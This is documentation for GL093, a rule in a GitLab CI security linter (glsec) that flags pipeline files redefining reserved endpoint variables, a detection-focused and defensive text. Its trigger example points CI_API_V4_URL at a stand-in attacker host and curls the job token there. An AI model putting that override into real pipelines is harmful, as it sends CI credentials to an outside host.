# GL093 — Reserved GitLab endpoint variable redefined

**Severity:** `warn`  
**OWASP:** [CICD-SEC-6 – Insufficient Credential Hygiene](https://owasp.org/www-project-top-10-ci-cd-security-risks/CICD-SEC-06-Insufficient-Credential-Hygiene)  
**CWE:** [CWE-923 – Improper Restriction of Communication Channel to Intended Endpoints](https://cwe.mitre.org/data/definitions/923.html)

## Risk

GitLab injects a set of predefined variables that pin the endpoints its own clients talk to: the runner's API calls, `glab`, `git clone`, and `docker login` all read them to decide which host to connect to, and requests to that host carry credentials — `CI_JOB_TOKEN`, registry credentials, or the credentials embedded in the clone URL. These values come from the server configuration and are the trust anchor of the job.

[GitLab advises against overriding predefined variables](https://docs.gitlab.com/ci/variables/predefined_variables/). Defining one in the pipeline file replaces the instance-provided value with a value chosen by whoever wrote the file: every GitLab-native client in the job then connects to, and sends its token to, the replacement host. A one-line change to `CI_API_V4_URL` or `CI_SERVER_URL` turns ordinary `glab api`, package-download or `git` commands into credential exfiltration, and jobs that merely follow the "use the built-in variables" convention do nothing visibly wrong.

## What glsec checks

A variable **definition** (the key of a `variables:` entry) whose name is exactly one of:

| Variable | Endpoint it pins |
|---|---|
| `CI_SERVER_PROTOCOL` / `CI_SERVER_HOST` / `CI_SERVER_PORT` / `CI_SERVER_URL` | The GitLab instance clients connect to |
| `CI_API_V4_URL` | The API root that API calls and `CI_JOB_TOKEN` requests are sent to |
| `CI_REPOSITORY_URL` | The URL jobs clone from; its host receives the job token |
| `CI_REGISTRY` / `CI_REGISTRY_IMAGE` | The container registry host images are pushed to, pulled from, and authenticated against |
| `CI_DEPENDENCY_PROXY_SERVER` | The Dependency Proxy server image pulls authenticate against |
| `CI_PROJECT_URL` | The HTTP(S) address of the project used as the GitLab endpoint |

Every `variables:` block GitLab can apply is checked: global (top-level and `default:`), `workflow:rules`, a job's own, and a job's `rules:variables`. Each definition is one `warn`, positioned on the variable key, with its scope (`global variables`, `workflow:rules variables`, `job "name" variables`, …). The short and long (`value:`/`description:`) forms are both flagged, and keys merged in through a YAML anchor are treated as if written inline.

The rule stays silent on:

- custom variables, including predefined variables that are not endpoints (`CI_PIPELINE_ID`, `CI_COMMIT_SHA`, …);
- values that merely **reference** a reserved variable (`API_ROOT: "$CI_SERVER_URL/api/v4"`, `curl "$CI_API_V4_URL/projects"`) — only a definition under that name counts;
- a reserved name in a comment or in a `rules:if` condition;
- names that merely look similar (`MY_CI_SERVER_URL`, `CI_SERVER_URL_EXTRA`) or differ in case (`ci_server_url`).

## Trigger example

```yaml
variables:
  CI_API_V4_URL: "https://gitlab.attacker.example/api/v4"

upload:
  script:
    - 'curl --header "JOB-TOKEN: $CI_JOB_TOKEN" "$CI_API_V4_URL/projects"'
```

## Safe alternative

Leave the endpoint variables to GitLab and use them as read-only inputs; add your own variable for any path suffix:

```yaml
variables:
  API_SUFFIX: "/api/v4"

upload:
  script:
    - 'curl --header "JOB-TOKEN: $CI_JOB_TOKEN" "${CI_API_V4_URL}/projects"'
```

## Notes

- Predefined variables are case-sensitive, so only the exact uppercase name is reported
- A handful of predefined variables (for example `CI_ENVIRONMENT_URL`) cannot be overridden by GitLab at all; they are not in the checked set
- If the override is genuinely intentional — for example pointing jobs at a mirror instance — keep it out of the pipeline file in platform configuration, or suppress the finding with a reason:

```yaml
variables:
  CI_SERVER_URL: "https://mirror.example.com"  # glsec:ignore GL093 -- jobs deliberately run against the mirror runner
```
